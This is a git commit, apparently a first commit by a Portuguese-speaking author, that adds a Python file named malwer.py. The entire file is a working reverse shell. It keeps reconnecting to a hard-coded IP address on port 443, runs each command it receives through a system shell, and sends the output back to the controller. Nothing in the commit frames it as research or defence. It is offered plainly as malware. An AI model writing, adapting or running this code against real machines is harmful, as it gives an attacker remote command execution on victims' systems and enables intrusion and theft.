990cee744e405206a48540a6854785b2f728abc8
Jonatas Santos <jonatassantos86117@gmail.com>
2026-09-14 10:30:06 -0300

    Primeiro commit

---
+++ malwer.py
@@ -0,0 +1,57 @@
+import socket
+import subprocess
+from time import sleep
+IP = '172.31.170.108'
+PORT = 443
+
+def connet(ip,port):
+    try:
+        c = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        c.connect((IP,PORT))
+        return c
+    except Exception as e:
+        print(f'connection error: {e}')
+
+
+def listen(c):
+    try:
+        while True:
+            data = c.recv(1024).decode().strip()
+            if data == '/sair':
+                return
+            else:
+                cmd(c,data)
+
+    except Exception as e:
+        print(f'listen funcion error:{e}')
+
+def cmd(c,data):
+    try:
+        p =  subprocess.Popen(
+            data,
+            shell=True,
+            stdin=subprocess.PIPE ,
+            stderr=subprocess.PIPE ,
+            stdout=subprocess.PIPE
+        )
+        c.send(
+            p.stdout.read() + p.stderr.read() + b'\n'
+        )
+
+    except Exception as e:
+        print(f'cmd function error:{e}')
+
+if __name__=='__main__':
+    try:
+        while True:
+            client = connet(IP,PORT)
+            if client:
+                listen(client)
+            else:
+                sleep(.5)
+
+    except KeyboardInterrupt:
+        print('progeam stoppedby the user')
+
+    except Exception as error:
+        print(f'main connetion {error}')
